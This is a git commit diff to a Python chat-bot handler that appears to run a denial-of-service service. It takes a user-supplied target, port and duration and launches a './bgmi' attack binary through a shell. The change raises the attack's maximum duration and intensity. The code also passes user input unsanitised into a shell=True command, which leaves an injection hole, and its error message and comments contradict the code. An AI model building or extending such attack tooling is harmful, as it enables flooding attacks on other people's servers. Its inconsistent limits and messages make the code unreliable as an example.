f83d67dd579c06706dbaaaa51e4945cdda3e8c1a
punishersam9 <guptaavi690@gmail.com>
2024-06-28 13:47:56 +0530

    Update serverr.py

--- serverr.py
+++ serverr.py
@@ -232,13 +232,13 @@ def handle_bgmi(message):
             target = command[1]
             port = int(command[2])  # Convert time to integer
             time = int(command[3])  # Convert port to integer
-            if time > 301:
+            if time > 601:
                 response = "Error: Time interval must be less than 300."
             else:
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 400"
+                full_command = f"./bgmi {target} {port} {time} 600"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
         else:
